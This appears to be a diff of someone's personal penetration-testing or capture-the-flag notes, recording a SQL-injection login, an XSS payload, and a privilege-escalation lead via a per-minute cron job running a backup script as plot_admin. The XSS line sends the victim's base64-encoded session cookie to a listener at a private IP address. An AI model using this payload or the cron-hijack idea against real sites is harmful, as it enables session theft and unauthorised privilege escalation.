@@ -68,3 +68,12 @@ USED SQL i to login, figure it out if you do it again
 Found that you can use XSS 
 
 <script>fetch('http://192.168.232.84:1111/?cookie=' + btoa(document.cookie));</script>
+
+
+
+---
+priv esc
+
+once i gain plot_admin
+
+* *     * * *   plot_admin /var/www/scripts/backup.sh
